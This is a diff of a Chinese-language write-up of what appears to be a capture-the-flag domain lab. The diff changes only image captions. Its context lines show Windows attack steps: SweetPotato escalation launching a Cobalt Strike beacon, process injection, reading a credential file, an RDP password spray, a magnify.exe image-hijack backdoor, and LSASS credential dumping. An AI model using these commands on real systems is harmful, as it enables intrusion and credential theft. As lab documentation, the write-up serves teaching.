@@ -41,23 +41,23 @@ rem 暂停以查看输出
 pause
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 链接之后激活组件，执行命令
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 **SeImpersonatePrivilege**权限可以使用甜土豆提权到SYSTEM， https://github.com/uknowsec/SweetPotato  上传上去 `C:/Users/Public/SweetPotato.exe -a "whoami"`，为了方便管理，上线C2，新建一个监听器
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 生成一个`beacon.exe`
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 全部传上去之后运行`C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/beacon.exe"`成功上线
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 ```bash
 shell whoami
@@ -171,15 +171,15 @@ shell net users
 shell query user
 ```
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 进程注入这个用户
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 成功上线John用户
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 看看网络共享
 
@@ -196,7 +196,7 @@ shell type \\TSCLIENT\C\credential.txt
 netexec rdp 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
 ```
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 要么过期要么登录失败，过期可以修改密码
 
@@ -214,7 +214,7 @@ RDP上去查看注册表
 Get-Acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
 ```
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 所有正常登录的用户都有权限修改注册表，修改注册表映像劫持，把本来用户主页点放大镜启动的`magnify.exe`替换成`C:\windows\system32\cmd.exe`
 
@@ -229,7 +229,7 @@ cd C:\Users\Aldrich\Desktop
 beacon1.exe
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 ```bash
 shell type C:\Users\Administrator\flag\flag02.txt
@@ -245,19 +245,19 @@ SharpHound.exe -c all
 
 查看域内管理员发现有WIN2016$
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
 看看出站对象控制
 
-![1](./assets/013.png)
+![image](./assets/013.png)
 
 可以直达DC01，并且再一看发现
 
-![1](./assets/014.png)
+![image](./assets/014.png)
 
 这个玩意也是域控，查看机器用户权限
 
-![1](./assets/015.png)
+![image](./assets/015.png)
 
 发现**SeDebugPrivilege**权限（SYSTEM用户都有），可以读取 LSASS，在CS4.2运行`logonpasswords`获得机器`NTHash`
 
